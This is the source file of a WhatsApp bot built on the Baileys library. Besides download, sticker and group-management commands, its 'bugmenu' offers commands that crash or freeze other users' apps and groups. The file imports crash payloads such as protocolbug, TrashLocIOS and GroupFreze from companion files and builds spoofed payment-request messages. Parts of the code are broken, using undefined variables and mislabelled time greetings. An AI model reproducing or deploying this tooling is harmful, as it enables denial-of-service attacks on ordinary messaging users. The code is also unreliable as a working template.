/*
> Recode script give credits to›
⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ

📝 | Created By ⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ
🖥️ | Base Ori By ⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ 
📝 | Created By ⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ
📌 |Credits ⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ 
📱 |Chat wa.me/2250500107362
👑 |Github: Dr Xenon 
✉️ |Email: xtechcorporation1@gmail.com
*/
require('./configure')
const {
    default: baileys,
    proto,
    jidNormalizedUser,
    generateWAMessage,
    generateWAMessageFromContent,
    getContentType,
    downloadContentFromMessage,
    prepareWAMessageMedia,
} = require("@whiskeysockets/baileys");

const os = require('os')
const fs = require('fs')
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const { color } = require('./list/lib/color')
const chalk = require('chalk')
const moment = require('moment-timezone')
const cron = require('node-cron')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const yts = require('yt-search')
const ytdl= require ('ytdl-core')
const gis = require('g-i-s')
const cheerio = require('cheerio')
const { randomBytes } = require('crypto')
const fg = require('api-dylux')
const googleTTS = require('google-tts-api')

const {translate} = require('@vitalets/google-translate-api')
const scp2 = require('./list/lib/scrape2') 

const absenData = {};
const { temporary, temmp } = require('./list/tempor')
const basepic = fs.readFileSync('./Media/basepic.jpg')
const babe = fs.readFileSync('./Media/babe.jpg')
const {
    exec,
    spawn,
    execSync
} = require("child_process")
const {
    performance
} = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const {
    TelegraPh,
    UploadFileUgu,
    webp2mp4File,
    floNime
} = require('./list/lib/uploader')
const {NotOwner, antilink, antilinkall, wapresence, badwordkick } = require("./configure.js");
const {
addPremiumUser,
getPremiumExpired,
getPremiumPosition,
expiredPremiumCheck,
checkPremiumUser,
getAllPremiumUser,
} = require('./list/lib/premiun')
const {
    toAudio,
    toPTT,
    toVideo,
    ffmpeg,
    addExifAvatar
} = require('./list/lib/converter')
const { buttoncast, pendingpay, payoutzep, TrashLocIOS, invico2, letterCrash, StickerPack6, spack2, GroupFreze } = require('./list/Data4.js')
const { protocolbug1, protocolbug2, protocolbug3, protocolbug5, protocolbug6, bulldozer, protocolbug7 } = require('./list/Data3.js')
const babi = fs.readFileSync('./Media/Xmd.jpg')
const {
    smsg,
    getGroupAdmins,
    formatp,
    formatDate,
    getTime,
    isUrl,
    await,
    tanggal,
    telegraPh,
    sleep,
    clockString,
    msToDate,
    sort,
    toNumber,
    enumGetKey,
    runtime,
    fetchJson,
    getBuffer,
    json,
    delay,
    toIDR,
    capital,
    format,
    logic,
    generateProfilePicture,
    parseMention,
    getRandom,
    pickRandom,
    runtimer,
    fetchBuffer,
    buffergif,
    GroupDB,
    kickQueue,
    totalcase
} = require('./list/lib/func')
const { remini } = require('./list/lib/remini');
const orgkaya = fs.readFileSync('./list/Database/premium.json')   
const owner = JSON.parse(fs.readFileSync('./list/Database/owner.json'))
const isPremium = owner || owner|| checkPremiumUser(m.sender, orgkaya);
global.db.data = JSON.parse(fs.readFileSync('./list/Database/database.json'))
if (global.db.data) global.db.data = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db.data || {})
}

let vote = db.data.others.vote = []
let kuismath = db.data.game.math = []
const xtime = moment.tz('Africa/Nairobi').format('HH:mm:ss')
const xdate = moment.tz('Africa/Nairobi').format('DD/MM/YYYY')
const time2 = moment().tz('Africa/Nairobi').format('HH:mm:ss')  
if(time2 < "23:59:00"){
var tennortimewisher = `Good Night mofo🌌`
 }
 if(time2 < "19:00:00"){
var tennortimewisher = `Good Evening mofo🌃`
 }
 if(time2 < "18:00:00"){
var tennortimewisher = `Good Evening mofo🌃`
 }
 if(time2 < "15:00:00"){
var tennortimewisher = `Good Afternoon mofo🌅`
 }
 if(time2 < "11:00:00"){
var tennortimewisher = `Good Morning mofo 🌄`
 }
 if(time2 < "05:00:00"){
var tennortimewisher = `Good Morning mofo🌄`
 } 
const time = moment().tz("Africa/Nairobi").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃 Early Morning"
} else if (time >= "15:00:00" && time < "19:00:00") {
    ucapanWaktu = "🌄GoodMorning"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️GoodAfternoon"
} else if (time >= "06:00:00" && time < "11:00:00") {
    ucapanWaktu = "🏙️Goodevening"
} else {
    ucapanWaktu = "🌆Goodnight"
};
const imageList = [
    "https://i.postimg.cc/xTRMBxQ4/afgan.jpg",
    "https://i.postimg.cc/xTRMBxQ4/afgan.jpg",
     "https://i.postimg.cc/xTRMBxQ4/afgan.jpg",
    "https://i.postimg.cc/xTRMBxQ4/afgan.jpg",
    "https://i.postimg.cc/xTRMBxQ4/afgan.jpg"
];
const RandomMenu = imageList[Math.floor(Math.random() * imageList.length)];

function getRandomFile(ext) {
    return `${Math.floor(Math.random() * 10000)}${ext}`;
}

//function
const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}
function capitaler(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}
//module
module.exports = bot = async (bot, m, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
        //prefix 1
        var prefix = ['+', '/',','] ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : xprefix
        const isCmd = body.startsWith(prefix, '')
        const isCmd2 = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const command2 = body.slice(1).trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await bot.decodeJid(bot.user.id)
        const itsMe = m.sender == botNumber ? true : false
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        //media
const bugres = 'Sending bug process....'      
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isDocument = (type == 'documentMessage')
        const isLocation = (type == 'locationMessage')
        const isContact = (type == 'contactMessage')
        const isSticker = (type == 'stickerMessage')
        const isText = (type == 'textMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
       //prefix 2
        const pric = /^#.¦|\\^/.test(body) ? body.match(/^#.¦|\\^/gi) : xprefix
        const xeonybody = body.startsWith(pric)
        const isCommand = xeonybody ? body.replace(pric, '').trim().split(/ +/).shift().toLowerCase() : ""
        const sticker = []
       //group
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await bot.groupMetadata(m.chat).catch(e => {}) : ''
        
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
const Media = m.mtype
        //user status
const xeonverifieduser = fs.readFileSync('./list/Database/user.json')

        const isUser = xeonverifieduser.includes(sender)
        const Owner = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium= Owner || checkPremiumUser(m.sender, orgkaya)
        expiredPremiumCheck(bot, m, orgkaya)
async function sendbotMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await bot.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}
if (global.autoRecording) {
        bot.sendPresenceUpdate('recording', from)
        }      
      if (global.autoTyping) {
        bot.sendPresenceUpdate('composing', from)
        }
        if (global.autorecordtype) {
        let xeonrecordin = ['recording','composing']
        let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]
        bot.sendPresenceUpdate(xeonrecordinfinal, from)

        }
 const groupName = isGroup ? groupMetadata.subject : "";      
if (m.message) {
    if (isCmd && !m.isGroup) {
        console.log(chalk.black(chalk.bgHex('#ff5e78').bold(`\n🌟 ${ucapanWaktu} 🌟`)));
        console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`🚀 New Message! 🚀`)))
        console.log(chalk.black(chalk.bgHex('#fdcb6e')(`📅 DATE: ${new Date().toLocaleString()}
💬 MESSAGE: ${m.body || m.mtype}
🗣️ SENDERNAME: ${pushname}
👤 JIDS: ${m.sender}`
     )
   )
);
    } else if (m.isGroup) {
        console.log(chalk.black(chalk.bgHex('#ff5e78').bold(`\n🌟 ${ucapanWaktu} 🌟`)));
        console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`🚀 New Message! 🚀`)));
        console.log(chalk.black(chalk.bgHex('#fdcb6e')(`📅 DATE: ${new Date().toLocaleString()}
💬 MESSAGE: ${m.body || m.mtype}
🗣️ SENDERNAME: ${pushname}
👤 JIDS: ${m.sender}
🔍 MESS LOCATION: ${groupName}`
       ))
     );
  }
}
const listcolor = ['aqua', 'red', 'blue', 'purple', 'magenta'];
const randomc = listcolor[Math.floor(Math.random() * listcolor.length)];

const moji = ['📚', '💭', '🌏', '〽️', '🌷', '🍁', '⛅',]
const randomemoji = moji[Math.floor(Math.random() * moji.length)]      
const inireact = async () => {
  const emojis = ["🌑", "🌘", "🌗", "🌕", "🌔", "🌓", "🌒", "🌑"];
  
  for (const emoji of emojis) {
    await sleep(80);
    bot.sendMessage(m.chat, { react: { text: emoji, key: m.key }});
  }
  
  await sleep(50);
  bot.sendMessage(m.chat, { react: { text: randomemoji, key: m.key }});
}
const loli = {
  key: {
    fromMe: false,
    participant: "13135550002@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: bot,
      itemCount: "9741",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `Sender : @${m.sender.split('@')[0]}\nCommand : ${command}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["2250500107362@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}

const mdmodes = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "2250141523296@s.whatsapp.net"
} : {}),
id: `${Date.now()}-${Math.random().toString(36).slice(2)}`
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: `⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ`
}
},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: 'INR'
}
}
},
status: 1,
  participant: "0@s.whatsapp.net"
}
//Reply function//
async function reply(teks) {
bot.sendMessage(m.chat, {
image: babe,  
caption: teks,
sourceUrl: 'https://github.com/Dr.Xenon2',    
contextInfo: {
forwardingScore: 9,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363294093005026@newsletter",
newsletterName: "© ⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ- 2025"
}
}
}, {
quoted: m
})
}
       const reply2 = async (text) => {
        await bot.sendMessage(m.chat, { text: text }, { quoted: mdmodes })
	  }
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
            var v16 = m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : m.mtype === "conversation" ? m.message.conversation : m.mtype == "imageMessage" ? m.message.imageMessage.caption : m.mtype == "videoMessage" ? m.message.videoMessage.caption : m.mtype == "extendedTextMessage" ? m.message.extendedTextMessage.text : m.mtype == "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId : m.mtype == "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId : m.mtype == "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId : m.mtype == "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : "";
         const v18 = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(v16) ? v16.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : ".";
        const v20 = v16.replace(v18, "").trim().split(/ +/).shift().toLowerCase();
       const v51 = ["✅"];    
        const v52 = v51[Math.floor(Math.random() * v51.length)];
    const vF4 = p11 => {
      return bot.sendMessage(m.chat, {
        react: {
          text: p11,
          key: m.key
        }
      });
    };
        async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}
penis = fs.readFileSync("./wise.js").toString(),
matches = penis.match(/case '[^']+'(?!.*case '[^']+')/g) || [],
caseCount = matches.length,
caseNames = matches.map(match => match.match(/case '([^']+)'/)[1]);

let totalCases = caseCount,
listCases = caseNames.join('\n⭔ ');   async function loading () {
    var bdick = [
        `▒▒▒▒▒▒▒▒▒▒ 0%`,
        `█▒▒▒▒▒▒▒▒▒ 10%`,
        `██▒▒▒▒▒▒▒▒ 20%`,
        `███▒▒▒▒▒▒▒ 30%`,
        `████▒▒▒▒▒▒ 40%`,
        `█████▒▒▒▒▒ 50%`,
        `██████▒▒▒▒ 60%`,
        `███████▒▒▒ 70%`,
        `████████▒▒ 80%`,
        `█████████▒ 90%`,
        `██████████ 100%`,
        `*⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ loaded...*`
    ]
    let { key } = await bot.sendMessage(m.chat, {text: `*Loading...*`})
    
    for (let i = 10; i < bdick.length; i++) {
        await bot.sendMessage(m.chat, {text: bdick[i], edit: key });
    }
}

//Command area(only case)
switch (isCommand) {
case 'starter': 
case 'menu': {
inireact()
await loading()
let allmenu = tennortimewisher + ` *@${sender.split("@")[0]}* 👋🏻
┏❐  ⌜ ⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ⌟  ❐
┃⭔ Creator :⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ 
┃⭔ Version : new version 
┃⭔ Type : Case
┃⭔ Status : Prêt.
┃⭔ Mode : ${bot.public ? '✱ Public ༣' : '✲ Self ༣'}
┃⭔ User : ${Object.keys(db.data.users).length}
┃⭔ Prefix : Single
┃⭔ Total commands :${totalCases}
┗❐
❐${prefix}ownermenu
❐${prefix}settingmenu
❐${prefix}cpanelmenu
❐${prefix}othermenu
❐${prefix}bugmenu
❐${prefix}status
❐${prefix}totalcase
❐${prefix}ping
❐${prefix}dev
`
 await bot.sendMessage(m.chat, {  
            video: {url: "https://files.catbox.moe/uhvf46.mp4"},
gifPlayback: true,
            caption: allmenu,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "𝐌𝐮𝐥𝐭𝐢 𝐃𝐞𝐯𝐢𝐜𝐞 𝐁𝐨𝐭",
                    newsletterJid: `120363294093005026@newsletter` 
                },
                isForwarded: true,
               externalAdReply: {
                   showAdAttribution: true,
                   title: `©⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ`,
                   body: "•Powered by ⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ",
                   mediaType: 1,
                   renderLargerThumbnail: true,
                   thumbnailUrl: RandomMenu,
                   sourceUrl: ``
                }
            }
        },{ quoted: mdmodes }
     ),
       await bot.sendMessage(m.chat, { 
           audio: { url: 'https://files.catbox.moe/1u8hj8.mp3' },
           mimetype: 'audio/mp4', 
           ptt: true 
       },{ quoted: loli }
     );
}
 break;
//==================================================//
case 'starterowner': 
case 'ownermenu': {
inireact()
await loading()  
let allmenu = tennortimewisher + ` *@${sender.split("@")[0]}* 👋🏻
┏❐  ⌜ ⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ⌟  ❐
┃⭔ Creator :⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ 
┃⭔ Version : new version 
┃⭔ Type : Case
┃⭔ Status : Ready
┃⭔ Mode : ${bot.public ? '✱ Public ༣' : '✲ Self ༣'}
┃⭔ User : ${Object.keys(db.data.users).length}
┃⭔ Prefix : Single 
┃⭔ Total commands :${totalCases}
┗❐
❐${prefix}self
❐${prefix}public 
❐${prefix}join 
❐${prefix}block
❐${prefix}unblock
❐${prefix}cekidgc
❐${prefix}creategc
`
 await bot.sendMessage(m.chat, {  
            video: {url: "https://files.catbox.moe/uhvf46.mp4"},
gifPlayback: true,
            caption: allmenu,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "𝐌𝐮𝐥𝐭𝐢 𝐃𝐞𝐯𝐢𝐜𝐞 𝐁𝐨𝐭",
                    newsletterJid: `120363294093005026@newsletter` 
                },
                isForwarded: true,
               externalAdReply: {
                   showAdAttribution: true,
                   title: `©⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ`,
                   body: "•Powered by ⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ",
                   mediaType: 1,
                   renderLargerThumbnail: true,
                   thumbnailUrl: RandomMenu,
                   sourceUrl: ``
                }
            }
        },{ quoted: mdmodes }
     ),
       await bot.sendMessage(m.chat, { 
           audio: { url: 'https://files.catbox.moe/1u8hj8.mp3' },
           mimetype: 'audio/mp4', 
           ptt: true 
       },{ quoted: loli }
     );
}
 break;
//==================================================//        
        case 'starterbugs': 
case 'bugmenu': {
inireact()
await loading()  
let allmenu = tennortimewisher + ` *@${sender.split("@")[0]}* 👋🏻
┏❐  ⌜ ⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ⌟  ❐
┃⭔ Creator :⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ 
┃⭔ Version : new version 
┃⭔ Type : Case
┃⭔ Status : Ready
┃⭔ Mode : ${bot.public ? '✱ Public ༣' : '✲ Self ༣'}
┃⭔ User : ${Object.keys(db.data.users).length}
┃⭔ Prefix : Single 
┃⭔ Total commands :${totalCases}
┗❐
    [𝐃𝐄𝐋𝐀𝐘-𝐁𝐔𝐆𝐒]
❐${prefix}delay-invis
❐${prefix}delay-hard
❐${prefix}catalog

    [𝐂𝐑𝐀𝐒𝐇-𝐁𝐔𝐆𝐒]
❐${prefix}crash-infinite 
❐${prefix}crashch
❐${prefix}crash-ios

    [𝐆𝐑𝐎𝐔𝐏-𝐀𝐓𝐓𝐀𝐂𝐊]
❐${prefix}blank-group 
❐${prefix}crashgroup
❐${prefix}frezegrup
`
await bot.sendMessage(m.chat, {  
            video: {url: "https://files.catbox.moe/uhvf46.mp4"},
gifPlayback: true,
            caption: allmenu,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "𝐌𝐮𝐥𝐭𝐢 𝐃𝐞𝐯𝐢𝐜𝐞 𝐁𝐨𝐭",
                    newsletterJid: `120363294093005026@newsletter` 
                },
                isForwarded: true,
               externalAdReply: {
                   showAdAttribution: true,
                   title: `©⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ`,
                   body: "•Powered by ⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ",
                   mediaType: 1,
                   renderLargerThumbnail: true,
                   thumbnailUrl: RandomMenu,
                   sourceUrl: ``
                }
            }
    },{ quoted: mdmodes }
     ),
       await bot.sendMessage(m.chat, { 
           audio: { url: 'https://files.catbox.moe/1u8hj8.mp3' },
           mimetype: 'audio/mp4', 
           ptt: true 
       },{ quoted: loli }
     );
}
 break;
//==================================================//
case 'status': {  
let os = require('os')
let timestamp = speed()
let latensi = speed() - timestamp
let run = runtime(process.uptime())

reply(`
┏❐  ⌜ ⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ⌟  ❐
┃⭔ Creator :⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ
┃⭔ Type : Case
┃⭔ Status : Maintenance 
┃⭔ Mode : ${bot.public ? '✱ Public ༣' : '✲ Self ༣'}
┃⭔ User : ${Object.keys(db.data.users).length}
┃⭔ Prefix : Single 
┃⭔ Resp Speed : ${latensi.toFixed(4)}
┃⭔ Ram : ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
┃⭔ Runtime : ${run}
┗❐

❐ Total Commands:${totalCases}

`)
}
break
           
//==================================================//
case 'settingmenu': 
case 'settings': {
inireact()
await loading()  
let allmenu = tennortimewisher + ` *@${sender.split("@")[0]}* 👋🏻
┏❐  ⌜ ⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ⌟  ❐
┃⭔ Creator :⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ 
┃⭔ Version : new version 
┃⭔ Type : Case
┃⭔ Status : Ready
┃⭔ Mode : ${bot.public ? '✱ Public ༣' : '✲ Self ༣'}
┃⭔ User : ${Object.keys(db.data.users).length}
┃⭔ Prefix : Single
┃⭔ Total commands :${totalCases}
┗❐
❐${prefix}autotype 
❐${prefix}autorecordtype 
❐${prefix}setpp
❐${prefix}delpp
❐${prefix}setbio
❐${prefix}statusview
❐${prefix}onlygroup
❐${prefix}onlypc
`
 await bot.sendMessage(m.chat, {  
            video: {url: "https://files.catbox.moe/uhvf46.mp4"},
gifPlayback: true,
            caption: allmenu,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "𝐌𝐮𝐥𝐭𝐢 𝐃𝐞𝐯𝐢𝐜𝐞 𝐁𝐨𝐭",
                    newsletterJid: `120363294093005026@newsletter` 
                },
                isForwarded: true,
               externalAdReply: {
                   showAdAttribution: true,
                                    title: `©⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ`,
 body: "•Powered by ⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ",                 
                   mediaType: 1,
                   renderLargerThumbnail: true,
                   thumbnailUrl: RandomMenu,
                   sourceUrl: ``
                }
            }
        },{ quoted: mdmodes }
     ),
       await bot.sendMessage(m.chat, { 
           audio: { url: 'https://files.catbox.moe/1u8hj8.mp3' },
           mimetype: 'audio/mp4', 
           ptt: true 
       },{ quoted: loli }
     );
}
 break;
//==================================================//
case 'others': 
case 'othermenu': {
inireact()
await loading()  
let allmenu = tennortimewisher + ` *@${sender.split("@")[0]}* 👋🏻
┏❐  ⌜ ⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ⌟  ❐
┃⭔ Creator :⏤ ͟͞ ❮❮๋ࣩࣧࣧࣧ͜͡➣ 𝐃𝐑 𝐗𝐄𝐍𝐎𝐍 ヤ 
┃⭔ Version : new version 
┃⭔ Type : Case
┃⭔ Status : Ready
┃⭔ Mode : ${bot.public ? '✱ Public ༣' : '✲ Self ༣'}
┃⭔ User : ${Object.keys(db.data.users).length}
┃⭔ Prefix : Single
┃⭔ Total commands :${totalCases}
┗❐
       [𝐆𝐑𝐎𝐔𝐏]
❐${prefix}kick
❐${prefix}add
❐${prefix}kill 
❐${prefix}promote 
❐${prefix}demote
❐${prefix}open 
❐${prefix}close
❐${prefix}link
❐${prefix}hidetag
❐${prefix}tagall 
❐${prefix}approve
❐${prefix}reject
❐${prefix}reset
❐${prefix}clearchat
❐${prefix}setppgroup

       [𝐃𝐎𝐖𝐋𝐎𝐀𝐃]
❐${prefix}play
❐${prefix}tt
❐${prefix}igdl
❐${prefix}song 
❐${prefix}fb
❐${prefix}yts
❐${prefix}lyrics 
❐${prefix}movie 
❐${prefix}ytmp4
❐${prefix}apk

       [𝐂𝐎𝐍𝐕𝐄𝐑𝐒𝐈𝐎𝐍]
❐${prefix}toptv
❐${prefix}sticker
❐${prefix}fancy
❐${prefix}toimage
❐${prefix}tovideo
❐${prefix}toaudio
❐${prefix}vv
❐${prefix}remini
❐${prefix}take
❐${prefix}translate
❐${prefix}enc

        [𝐂𝐎𝐋𝐋𝐄𝐂𝐓𝐈𝐎𝐍]
❐${prefix}getname
❐${prefix}getpp
❐${prefix}getppgc
❐${prefix}getname
❐${prefix}getbusiness
❐${prefix}listblock
❐${prefix}listpc
❐${prefix}gcinfo
❐${prefix}lookup
❐${prefix}gitclone
❐${prefix}chatgpt

       [𝐕𝐎𝐈𝐂𝐄]
❐${prefix}bass
❐${prefix}blown
❐${prefix}robot 
❐${prefix}slow
❐${prefix}smooth
❐${prefix}fat
❐${prefix}fast
❐${prefix}nightcore
❐${prefix}earrape 

     [𝐒𝐎𝐔𝐍𝐃]
❐${prefix}sound1-sound161

     [𝐒𝐓𝐀𝐋𝐊𝐄𝐑]
❐${prefix}ttstalk

       [𝐒𝐘𝐒𝐓𝐄𝐌-𝐏𝐀𝐈𝐑]
❐${prefix}pair
